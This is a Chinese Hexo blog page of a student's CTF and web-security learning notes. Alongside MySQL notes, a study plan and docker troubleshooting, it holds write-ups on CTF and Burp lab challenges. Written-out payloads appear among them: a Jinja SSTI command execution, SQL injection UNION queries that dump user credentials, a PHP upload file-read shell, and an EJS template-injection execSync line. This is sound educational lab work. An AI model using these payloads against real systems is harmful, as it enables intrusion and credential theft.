<h3 id="explain语句"><a href="#explain语句" class="headerlink" title="explain语句"></a>explain语句</h3><p>语法：explain select …<br>用来查看SQL语句执行效果</p>
<h3 id="索引失效"><a href="#索引失效" class="headerlink" title="索引失效"></a>索引失效</h3><p>1.模糊匹配当中以“%”开头 如：select * from emp where ename like ‘%T’;<br>2.使用or的时候其中一边有一个字段没有索引（union不会失效）<br>3.使用复合索引（两个字段，或者更多的字段联合起来添加一个索引）的时候，没有使用左侧的列查找<br>4.在where当中索引列参加了运算<br>5.在where当中索引列使用了函数<br>…<br>(没有直接匹配结果则失效？)</p>
<h3 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h3><p>单一索引：一个字段上添加索引。<br>复合索引：两个字段或者更多的字段上添加索引。<br>主键索引：主键上添加索引。<br>唯一性索引：具有unique约束的字段上添加索引。<br>…..</p>
<h2 id="31-视图"><a href="#31-视图" class="headerlink" title="31.视图"></a>31.视图</h2><p>视图（虚拟表）：站在不同的角度去看待同一份数据，是一种根据查询（也就是 SELECT 表达式）定义的数据库对象，用于获取想要看到和使用的局部数据。用来提高检索效率，隐藏表的实现细节（面向视图检索）</p>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>创建：create view 视图名 as select …;（mysql 不支持子查询创建视图）<br>删除：drop view (if exists) 视图名 ;<br>修改：alter view 视图名 as select …;</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>可以面向视图对象进行增删改查（看作一张表），对视图对象的增删改查，会导致原表被操作！（视图的特点：通过对视图的操作，会影响到原表数据。）方便，简化开发，利于维护</p>
<h2 id="32-DBA"><a href="#32-DBA" class="headerlink" title="32.DBA"></a>32.DBA</h2><p>重点数据导入导出（数据备份）</p>
<h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><p>登录 MYSQL 数据库管理系统之后执行：source D:\ bjpowernode.sql</p>
<h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p>导出整个数据库：在 windows 的 dos 命令窗口中执行：mysqldump bjpowernode&gt;D:\bjpowernode.sql -uroot -p123<br>导出指定库下的指定表：在 windows 的 dos 命令窗口中执行：mysqldump bjpowernode emp&gt; D:\ bjpowernode.sql -uroot –p123</p>
<h2 id="33-数据库设计三范式"><a href="#33-数据库设计三范式" class="headerlink" title="33.数据库设计三范式"></a>33.数据库设计三范式</h2><p>第一范式：有主键，具有原子性，字段不可分割<br>第二范式：完全依赖，没有部分依赖<br>第三范式：没有传递依赖</p>
<h3 id="表设计总结"><a href="#表设计总结" class="headerlink" title="表设计总结"></a>表设计总结</h3><p>一对多：一对多，两张表，多的表加外键<br>多对多：多对多，三张表，关系表两个外键<br>一对一：一张表字段太多，太庞大就拆分表，外键唯一</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/13/week1/" data-id="clk6k5tln00092gudcbm848y3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-warmup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/04/28/warmup/" class="article-date">
  <time datetime="2023-04-28T08:08:35.000Z" itemprop="datePublished">2023-04-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/04/28/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>无所谓会不会，主要是图一乐<br>又菜又爱玩才能进步</p>
<h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h4><h5 id="viewsource"><a href="#viewsource" class="headerlink" title="viewsource"></a>viewsource</h5><p>没啥好说的，F12</p>
<h5 id="filechecker"><a href="#filechecker" class="headerlink" title="filechecker"></a>filechecker</h5><p>先再次复习下再继续</p>
<img src="/2023/04/28/warmup/az.png" class="">
<p>啊这（<br>找了网上的payload，这题先随便传个图片上去，然后把那些二进制的内容删掉改成</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="comment">#! &#123;&#123;lipsum.__globals__.os.popen(&quot;cat /flag&quot;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>这题应该是借文件上传利用SSTI获得flag，写的时候一直想怎么注入cat flag命令结果是这样的方式，多刷吧还是没办法马上反应过来(想着怎么利用bin那句命令结果忘了之前的SSIT了emm)<br>FCTF{realflag_5vycRgpY1Ekhrdk5wLcJoynj3QOH2JUoUfbCG0he}</p>
<h5 id="javadeserialize"><a href="#javadeserialize" class="headerlink" title="javadeserialize"></a>javadeserialize</h5><p>emm这个折腾的有点久有点问题<br>——————————————————————————<br>捋一捋IDEA的使用，好像哪里不大对<br>在IDEA的使用上折腾有点久，最开始时一直报错，至少现在能打开了能运行了（ 还在调试题目的源文件，复制黏贴时文件有点问题，复制的文件不是“可执行类”，没法达到想要的效果，单纯的复制文件不会被真正导入，再慢慢找问题。可能忘记改pom?<br>——————————————————————————<br>最开始用IDEA时手忙脚乱，似乎把题目文件结构破坏了，尝试了很多次，初次IDEA不熟悉它的工作方式犯了不少低级错误，甚至忘了Maven,因为添加目录为库时没操作好让程序报错，还以为又是自己把文件损坏了（</p>
<h4 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/28/warmup/" data-id="clk6k5tln00082gud2xyt54g8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-aaaa" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/04/27/aaaa/" class="article-date">
  <time datetime="2023-04-27T12:05:50.000Z" itemprop="datePublished">2023-04-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/04/27/aaaa/">2023/04/15：burplabs从0开始</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这里的题目看起来更像真实的场景<br>可惜有点卡，下面的解答视频有一种没带眼镜的美<br>有完整教程，很行</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="apprentice"><a href="#apprentice" class="headerlink" title="apprentice"></a>apprentice</h3><p>开网页的时间比写还久（恼）</p>
<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>第一题为get注入 单引号闭合然后1=1就完事了<br>有点卡反应比较慢</p>
<img src="/2023/04/27/aaaa/lab1.png" class="">
<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>简单的万能密码，啥过滤也没有</p>
<img src="/2023/04/27/aaaa/lab2.png" class="">
<h3 id="practitoner"><a href="#practitoner" class="headerlink" title="practitoner"></a>practitoner</h3><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>联合查询第一步，column的数量</p>
<img src="/2023/04/27/aaaa/lab3.png" class="">
<p>一直用null测出数量</p>
<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>union select，找到指定column，把上一题的一个null替换即可</p>
<h4 id="4-5"><a href="#4-5" class="headerlink" title="4.5"></a>4.5</h4><p>burp内有教程，但是全英文属实有点难受<br>但想到之前sql注入总是因为语句不合适失败还是先硬着头皮边看边写吧</p>
<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>get传参的联合注入，直接在地址栏注就行：’+UNION+SELECT+username,+password+FROM+users–<br>回显在下面文章标题（？）那里，感觉很奇怪好像也很合理</p>
<h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="string">&#x27; UNION SELECT username || &#x27;</span>~<span class="string">&#x27; || password FROM users--</span></span><br></pre></td></tr></table></figure>
<p>emm大概是一种联合查询技巧以便更好的得到所需数据吧</p>
<h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><h2 id="File-upload"><a href="#File-upload" class="headerlink" title="File upload"></a>File upload</h2><p>文件上传复习</p>
<h3 id="apprentice-1"><a href="#apprentice-1" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>用php文件，写上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ &lt;?php </span><br><span class="line"> <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;/home/carlos/secret&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>把这个文件在上传头像的地方上传，然后右键在新网页打开头像即可</p>
<p>这个是github上找的方法比官方给的省事<br>可能因为网络问题用官方改数据包的方式可能失败</p>
<h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>将Content-Type改为image/jpeg或png即可</p>
<h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>emm burp好像遇到了点问题似乎改不了包 折腾太久了先放着<br>这一题的防护比上次更严格，要先将php传入file文件夹里才能绕过检测</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/27/aaaa/" data-id="clk6k5tlk00032gud949n26ie" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-jihua" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/04/18/jihua/" class="article-date">
  <time datetime="2023-04-18T08:08:21.000Z" itemprop="datePublished">2023-04-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/04/18/jihua/">2023/04/18：一点大致计划</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="短期内的计划"><a href="#短期内的计划" class="headerlink" title="短期内的计划"></a>短期内的计划</h4><p>-1.改一下打字习惯，一阳指难绷<br>0.参加ctf校内赛，尽力而为吧<br>1.没事刷点lab 先看burp里的<br>2.上c++时顺便把类与对象搞懂<br>3.暑假或别的时候把java python之前速成的洞补一点<br>3.5.然后就可以继续看代码审计的书了<br>4.继续整理之前的题目<br>5.把docker的一点问题解决了<br>6.以及内网渗透开个头</p>
<h4 id="长期的安排"><a href="#长期的安排" class="headerlink" title="长期的安排"></a>长期的安排</h4><p>没想好先空着</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/18/jihua/" data-id="clk6k5tll00052gudg2f7fklq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-4-9" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/04/09/4-9/" class="article-date">
  <time datetime="2023-04-09T07:51:57.000Z" itemprop="datePublished">2023-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/04/09/4-9/">2023/04/09：docker遇到的问题与解决</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="dockerfile-1"><a href="#dockerfile-1" class="headerlink" title="dockerfile-1"></a>dockerfile-1</h3><p>以下为dockerfile</p>


<h4 id="docker-compose-up-d失败"><a href="#docker-compose-up-d失败" class="headerlink" title="docker-compose up -d失败"></a>docker-compose up -d失败</h4>
<p>百度到的解决方案一般针对[manifests 18.04]，问大佬后选择直接pull至仓库再拉取镜像，原因目前未知</p>
<h4 id="docker-run-之后镜像立即退出"><a href="#docker-run-之后镜像立即退出" class="headerlink" title="docker run 之后镜像立即退出"></a>docker run 之后镜像立即退出</h4><p>用网上添加 -it 以及 /bin/bash 可解决<br>百度原因有三：<br>1、docker容器运行必须有一个前台进程， 如果没有前台进程执行，容器认为空闲，就会自行退出<br>2、容器运行的命令如果不是那些一直挂起的命令（ 运行top，tail、循环等），就是会自动退出<br>3、这个是 docker 的机制问题</p>
<h4 id="进入网页后显示当前无法使用"><a href="#进入网页后显示当前无法使用" class="headerlink" title="进入网页后显示当前无法使用"></a>进入网页后显示当前无法使用</h4><img src="/2023/04/09/4-9/2.png" class="">
<p>用命令行进入如下：</p>
<img src="/2023/04/09/4-9/22.png" class="">
<p>目前找到的解决方法：<br>1.使用ssh（无效）<br>2.查看是否使用网络代理<br>不知道在一众复制黏贴中有没有能用的</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/09/4-9/" data-id="clk6k5tlj00022gud3056e424" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-3-31" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/04/01/3-31/" class="article-date">
  <time datetime="2023-04-01T14:47:08.000Z" itemprop="datePublished">2023-04-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/04/01/3-31/">2023/03/31：一些囫囵吞枣式的记录</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>一些复现（？）<br>反正就是没做出来的题，在这记录一下，一些反思啥的</p>
<h3 id="hxp-CTF-2022-valentine"><a href="#hxp-CTF-2022-valentine" class="headerlink" title="hxp CTF 2022 - valentine"></a>hxp CTF 2022 - valentine</h3><p>这里留下一个官方wp的链接：<a target="_blank" rel="noopener" href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/">https://hxp.io/blog/101/hxp-CTF-2022-valentine/</a><br>纯英文导致阅读障碍，看的不是很懂，水平可怜，若有问题见谅</p>
<p>首先，当然是判断漏洞类型，这题的注入是&lt;% %&gt;形式，写的时候只知道这好像是模板类的注入，但是尝试后没啥收获，不知道咋入手，下面是官方解答：</p>
<img src="/2023/04/01/3-31/jieda.png" class="">
<p>emmm没多练是这样的，记得大佬有说过多练提高速度，显然目前的水平还不足以独立的写完<br>这题要利用的似乎是一个比较新的漏洞</p>
<img src="/2023/04/01/3-31/kkk.png" class="">
<p>在这篇wp提到了题目的来源（应该这么表达吧），似乎用了一个比较新的方式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &lt;.- global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() .&gt;</span><br></pre></td></tr></table></figure>
<p>感觉是对症下药式的<br>以及我以前一直不太注意的Dockerfile也很重要:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ENV NODE_ENV=production</span><br></pre></td></tr></table></figure>
<p>这个环境变量会在下一步用于缓存获得flag<br>感觉很新，说实话看得云里雾里的</p>
<p>啊这个更详细<a target="_blank" rel="noopener" href="https://maoutis.github.io/writeups/Web%20Hacking/valentine/">https://maoutis.github.io/writeups/Web%20Hacking/valentine/</a><br>这里详细地介绍了整个思路和各种尝试</p>
<img src="/2023/04/01/3-31/111.png" class="">
<p>在得知使用了ejs模板后，这个作者发现可以使用一些别的符号代替&lt;% %&gt;，为模板注入提供了可能，就可以用&lt;. .&gt;来注入需要的模板<br>然后是靠express中的view options重写文件来传入命令？有点懵，不过view options似乎是还未更新可以利用的bug，这两个wp都利用这点</p>
<p>先告一段落</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/01/3-31/" data-id="clk6k5tli00012gud1vww1usa" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/03/19/1/" class="article-date">
  <time datetime="2023-03-19T04:53:18.000Z" itemprop="datePublished">2023-03-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/03/19/1/">2023/03/18</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>一些BUUCTF记录</p>
<h3 id="SecretFile"><a href="#SecretFile" class="headerlink" title="SecretFile"></a>SecretFile</h3><p>很明显是要去找flag文件</p>
<img src="/2023/03/19/1/secret1.png" class="">
<p>刚开始面对这个界面有点懵，啥也没有，看了源码才知道把连接调得和背景色一样</p>
<img src="/2023/03/19/1/a2.png" class="">
<p>进来是这样的<br>bp抓包返回可以看到secr3t.php文件，下面是文件内容，用php伪协议包含就行</p>
<img src="/2023/03/19/1/a1.png" class="">
<p>感觉更像一个恶作剧<br>（是的这有点简单了但我主要想试试图片发出来啥效果()）</p>
<h3 id="BabySQli1"><a href="#BabySQli1" class="headerlink" title="BabySQli1"></a>BabySQli1</h3><p>源码：<a target="_blank" rel="noopener" href="https://github.com/imaginiso/GXY_CTF/tree/master/Web/BabySqli">https://github.com/imaginiso/GXY_CTF/tree/master/Web/BabySqli</a><br>感觉跟CTF After Dark的一题很像（Injection Perfection应该是这个）该题要求以管理员的账号登录，但查看源码可以得知把or和一些字符屏蔽了，需要让联合查询产生虚拟数据<br>（还给密码上了md5，被这个卡了真难受）</p>
<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><img src="/2023/03/19/1/1.png" class="">
<p>源码提示如上<br>该题需要对password和money传参，绕过is_numeric()和strcmp()函数（wp说是根据php版本和取值猜出来是strcmp，看来审计要多看）根据提示，抓包中cookie中user=0要改为1，然后%20绕过is_numeric和数组绕过strcmp，跟冬令营的php很像</p>
<h3 id="PingPingPing"><a href="#PingPingPing" class="headerlink" title="PingPingPing"></a>PingPingPing</h3><p>这题是看别人博客时突然想去看一下时做的<br>上CSDN看一下有两个比较有印象的wp:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44348894/article/details/105352676?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167914286516800217238563%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167914286516800217238563&amp;biz_id=0&amp;utm_medium=distribute.wap_search_result.none-task-blog-2~all~top_positive~default-1-105352676-null-null.wap_search_all_course_earnings_v1&amp;utm_term=pingpingping&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/weixin_44348894/article/details/105352676?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167914286516800217238563%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167914286516800217238563&amp;biz_id=0&amp;utm_medium=distribute.wap_search_result.none-task-blog-2~all~top_positive~default-1-105352676-null-null.wap_search_all_course_earnings_v1&amp;utm_term=pingpingping&amp;spm=1018.2118.3001.4187</a><br>这个方法用sh代替了bash，将cat flag.php用base64编码后执行<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45414878/article/details/109557567">https://blog.csdn.net/qq_45414878/article/details/109557567</a><br>这篇同上用sh，额外提到了cat ls或cat *直接查看当前目录所有内容，但自己试的时候用他cat ls的payload会被过滤；两篇最后字符串拼接的方法相同但第一篇作者说会被屏蔽，自己试时同第二篇可以绕过，单纯因为ag在前在后？<br>（这种怎么也是1分啊）</p>
<h4 id="水"><a href="#水" class="headerlink" title="水"></a>水</h4><p>周五时用chrome接bp代理结果没法用一直超时，不知道是证书还是啥原因挺麻的早知道就重新安装了</p>
<p>补:折腾到现在，大概是Proxy SwitchyOmega这个插件的问题，直接改本地服务器代理就行（真是浪费人生，好像我经常把时间花在一些弱智的问题上）然后旧版的hackbar好像是用不了的（就是那个改付费要破解的），火狐跟谷歌都一样，无法load url也不能发送，百度无果，不知道啥情况<br>解决这些问题还是偶然发现学长给的bp压缩包里有附带的说明书，近在眼前的答案没发现…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/19/1/" data-id="clk6k5tle00002gud997khv9u" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/07/21/xsslab/">2023/7/21：夏令营week2记录:xsslab</a>
          </li>
        
          <li>
            <a href="/2023/07/16/week1plus/">2023/07/15：夏令营week1记录:出题</a>
          </li>
        
          <li>
            <a href="/2023/07/16/weekpro/">2023/07/16：夏令营week1记录:sql-lab</a>
          </li>
        
          <li>
            <a href="/2023/07/13/week1/">2023/07/10：夏令营week1记录:mysql笔记</a>
          </li>
        
          <li>
            <a href="/2023/04/28/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>